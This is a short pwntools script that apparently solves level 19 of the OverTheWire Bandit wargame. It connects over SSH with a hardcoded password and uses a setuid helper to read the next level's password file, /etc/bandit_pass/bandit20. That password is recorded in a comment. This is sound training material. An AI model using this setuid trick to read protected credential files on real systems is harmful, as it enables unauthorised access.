from pwn import *
import string
shell = ssh('bandit19', 'bandit.labs.overthewire.org',
    password='IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x')
sh = shell.run('bash')
sh.recv(timeout=5).decode()

sh.sendline('ls -la')
log.info(sh.recv(timeout=10).decode())
log.info(sh.recv(timeout=5).decode())

# to experiment and dissect with the setuid
#shell.download_file('./bandit20-do')

sh.sendline('./bandit20-do cat /etc/bandit_pass/bandit20')
log.info(sh.recv().decode())
log.info(sh.recv(timeout=5).decode())

#pass GbKksEFF4yrVs6il55v6gwY5aVje5f0j
